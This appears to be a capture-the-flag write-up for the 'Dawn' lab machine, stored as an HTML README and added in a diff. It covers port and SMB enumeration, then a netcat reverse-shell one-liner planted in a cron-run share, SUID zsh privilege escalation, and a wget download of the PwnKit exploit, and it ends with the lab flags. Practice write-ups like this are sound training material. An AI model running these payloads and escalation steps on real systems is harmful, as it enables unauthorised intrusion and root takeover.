@@ -1,0 +1,227 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>README.md</title>
+</head><body><br/>
+IP - 10.0.2.48<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+nmap result<br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/offensive_security_playground/Dawn]<br/>
+└─# nmap -sC -sV 10.0.2.48 -p- -oN nmap_all_port.txt<br/>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-03 18:48 +0630<br/>
+Nmap scan report for 10.0.2.48<br/>
+Host is up (0.000090s latency).<br/>
+Not shown: 65531 closed tcp ports (reset)<br/>
+PORT &nbsp; &nbsp; STATE SERVICE &nbsp; &nbsp; VERSION<br/>
+80/tcp &nbsp; open &nbsp;http &nbsp; &nbsp; &nbsp; &nbsp;Apache httpd 2.4.38 ((Debian))<br/>
+|_http-server-header: Apache/2.4.38 (Debian)<br/>
+|_http-title: Site doesn't have a title (text/html).<br/>
+139/tcp &nbsp;open &nbsp;netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br/>
+445/tcp &nbsp;open &nbsp;netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)<br/>
+3306/tcp open &nbsp;mysql &nbsp; &nbsp; &nbsp; MySQL 5.5.5-10.3.15-MariaDB-1<br/>
+| mysql-info: <br/>
+| &nbsp; Protocol: 10<br/>
+| &nbsp; Version: 5.5.5-10.3.15-MariaDB-1<br/>
+| &nbsp; Thread ID: 13<br/>
+| &nbsp; Capabilities flags: 63486<br/>
+| &nbsp; Some Capabilities: FoundRows, Support41Auth, LongColumnFlag, SupportsLoadDataLocal, ODBCClient, Speaks41ProtocolOld, SupportsTransactions, DontAllowDatabaseTableColumn, InteractiveClient, IgnoreSpaceBeforeParenthesis, SupportsCompression, IgnoreSigpipes, ConnectWithDatabase, Speaks41ProtocolNew, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins<br/>
+| &nbsp; Status: Autocommit<br/>
+| &nbsp; Salt: &gt;D{`QQ&amp;gW^QYN[[;Tse!<br/>
+|_ &nbsp;Auth Plugin Name: mysql_native_password<br/>
+MAC Address: 08:00:27:D1:C6:A7 (Oracle VirtualBox virtual NIC)<br/>
+Service Info: Host: DAWN<br/>
+<br/>
+Host script results:<br/>
+|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s<br/>
+| smb2-security-mode: <br/>
+| &nbsp; 311: <br/>
+|_ &nbsp; &nbsp;Message signing enabled but not required<br/>
+|_nbstat: NetBIOS name: DAWN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 000000000000 (Xerox)<br/>
+| smb-os-discovery: <br/>
+| &nbsp; OS: Windows 6.1 (Samba 4.9.5-Debian)<br/>
+| &nbsp; Computer name: dawn<br/>
+| &nbsp; NetBIOS computer name: DAWN\x00<br/>
+| &nbsp; Domain name: dawn<br/>
+| &nbsp; FQDN: dawn.dawn<br/>
+|_ &nbsp;System time: 2023-03-03T07:18:52-05:00<br/>
+| smb-security-mode: <br/>
+| &nbsp; account_used: guest<br/>
+| &nbsp; authentication_level: user<br/>
+| &nbsp; challenge_response: supported<br/>
+|_ &nbsp;message_signing: disabled (dangerous, but default)<br/>
+| smb2-time: <br/>
+| &nbsp; date: 2023-03-03T12:18:52<br/>
+|_ &nbsp;start_date: N/A<br/>
+<br/>
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br/>
+Nmap done: 1 IP address (1 host up) scanned in 20.43 seconds<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+smbmap result<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# smbmap -H 10.0.2.48 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+[+] IP: 10.0.2.48:445 &nbsp; Name: 10.0.2.48 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Disk &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Permissions &nbsp; &nbsp; Comment<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ---- &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;----------- &nbsp; &nbsp; -------<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; print$ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;NO ACCESS &nbsp; &nbsp; &nbsp; Printer Drivers<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ITDEPT &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;READ, WRITE &nbsp; &nbsp; PLEASE DO NOT REMOVE THIS SHARE. IN CASE YOU ARE NOT AUTHORIZED TO USE THIS SYSTEM LEAVE IMMEADIATELY.<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; IPC$<br/>
+<br/>
+<br/>
+Enum4linux result (Found two username)<br/>
+<br/>
+[+] Enumerating users using SID S-1-22-1 and logon username '', password '' &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+S-1-22-1-1000 Unix User\dawn (Local User) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+S-1-22-1-1001 Unix User\ganimedes (Local User)<br/>
+<br/>
+<br/>
+<br/>
+I found that ITDEPT share has read and write permission for us that's good news. But, we don't know what to do with this share so I enumerate web app.<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Dirserach Result<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# dirsearch -u http://10.0.2.48/ -e php -f -x 400,403<br/>
+<br/>
+&nbsp; _|. _ _ &nbsp;_ &nbsp;_ &nbsp;_ _|_ &nbsp; &nbsp;v0.4.2<br/>
+&nbsp;(_||| _) (/_(_|| (_| )<br/>
+<br/>
+Extensions: php | HTTP method: GET | Threads: 30 | Wordlist size: 13441<br/>
+<br/>
+Output File: /root/.dirsearch/reports/10.0.2.48/-_23-03-03_18-50-05.txt<br/>
+<br/>
+Error Log: /root/.dirsearch/logs/errors-23-03-03_18-50-05.log<br/>
+<br/>
+Target: http://10.0.2.48/<br/>
+<br/>
+[18:50:05] Starting: <br/>
+[18:50:24] 200 - &nbsp;791B &nbsp;- /index.html &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+[18:50:26] 200 - &nbsp; &nbsp;2KB - /logs/ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+[18:50:26] 301 - &nbsp;305B &nbsp;- /logs &nbsp;-&gt; &nbsp;http://10.0.2.48/logs/ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+Task Completed<br/>
+<br/>
+I got management.log from http://10.0.2.48/logs/management.log<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Got Reverse Shell from smbshare cron job <br/>
+<br/>
+I read management.log and found that "product-control" and "web-control" from smbshare run with cron job. I decided to check smbshare and there is no file with those name so I created reverse shell script and uploaded it into smbshare and wait 1 to 2 minute and then I got reverse shell:<br/>
+<br/>
+Step 1:<br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/offensive_security_playground/Dawn]<br/>
+└─# nano web-control<br/>
+<br/>
+payload - rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.0.2.4 4444 &gt;/tmp/f<br/>
+<br/>
+Step 2:<br/>
+<br/>
+Upload into smbshare<br/>
+<br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/offensive_security_playground/Dawn]<br/>
+└─# smbclient //10.0.2.48/ITDEPT &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+Password for [WORKGROUP\root]:<br/>
+Try "help" to get a list of possible commands.<br/>
+smb: \&gt; put web-control<br/>
+putting file web-control as \web-control (0.7 kb/s) (average 0.7 kb/s)<br/>
+smb: \&gt; ls<br/>
+&nbsp; . &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; D &nbsp; &nbsp; &nbsp; &nbsp;0 &nbsp;Fri Mar &nbsp;3 19:03:09 2023<br/>
+&nbsp; .. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;D &nbsp; &nbsp; &nbsp; &nbsp;0 &nbsp;Sat Aug &nbsp;3 09:51:39 2019<br/>
+&nbsp; web-control &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; A &nbsp; &nbsp; &nbsp; 71 &nbsp;Fri Mar &nbsp;3 19:03:09 2023<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 7158264 blocks of size 1024. 2937992 blocks available<br/>
+smb: \&gt;<br/>
+<br/>
+Step 3:<br/>
+<br/>
+Got Reverse shell<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# nc -lvnp 4444 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+listening on [any] 4444 ...<br/>
+connect to [10.0.2.4] from (UNKNOWN) [10.0.2.48] 51900<br/>
+sh: 0: can't access tty; job control turned off<br/>
+$ whoami<br/>
+www-data<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Priv Escalation (SUID /usr/bin/zsh)<br/>
+<br/>
+After running linpeas, I found SUID /usr/bin/zsh so I search at gtfobin:<br/>
+<br/>
+<br/>
+https://gtfobins.github.io/gtfobins/zsh/#suid<br/>
+<br/>
+<br/>
+www-data@dawn:/tmp$ /usr/bin/zsh<br/>
+dawn# whoami<br/>
+root<br/>
+<br/>
+dawn# cat flag.txt<br/>
+Hello! whitecr0wz here. I would like to congratulate and thank you for finishing the ctf, however, there is another way of getting a shell(very similar though). Also, 4 other methods are available for rooting this box!<br/>
+<br/>
+flag{3a3e52f0a6af0d6e36d7c1ced3a9fd59}<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Another Way To Priv Escalation (kernel Exploit (PwnKit))<br/>
+<br/>
+I already compiled gcc PwnKit in my kali machine<br/>
+<br/>
+<br/>
+Step 1:<br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/tools/Pwnkit]<br/>
+└─# python2 -m SimpleHTTPServer 80<br/>
+<br/>
+Step 2:<br/>
+<br/>
+www-data@dawn:/tmp$ wget http://10.0.2.4/PwnKit<br/>
+--2023-03-03 07:57:39-- &nbsp;http://10.0.2.4/PwnKit<br/>
+Connecting to 10.0.2.4:80... connected.<br/>
+HTTP request sent, awaiting response... 200 OK<br/>
+Length: 16800 (16K) [application/octet-stream]<br/>
+Saving to: ‘PwnKit’<br/>
+<br/>
+PwnKit &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;100%[===================&gt;] &nbsp;16.41K &nbsp;--.-KB/s &nbsp; &nbsp;in 0.01s &nbsp; <br/>
+<br/>
+2023-03-03 07:57:39 (1.19 MB/s) - ‘PwnKit’ saved [16800/16800]<br/>
+<br/>
+www-data@dawn:/tmp$<br/>
+<br/>
+Step 3:<br/>
+<br/>
+www-data@dawn:/tmp$ chmod +x PwnKit<br/>
+<br/>
+Step 4:<br/>
+<br/>
+Exploit <br/>
+<br/>
+www-data@dawn:/tmp$ ./PwnKit <br/>
+root@dawn:/tmp# whoami<br/>
+root<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Offensive Security Playground Lab Flags<br/>
+<br/>
+www-data@dawn:~$ cat /home/dawn/local.txt<br/>
+f9c0923d4b01f677b0d7e760e565c51d<br/>
+<br/>
+dawn# cat proof.txt <br/>
+77a87e8ffca14a2eb9dad0fe7ee60dc6<br/>
+<br/>
+</body></html>
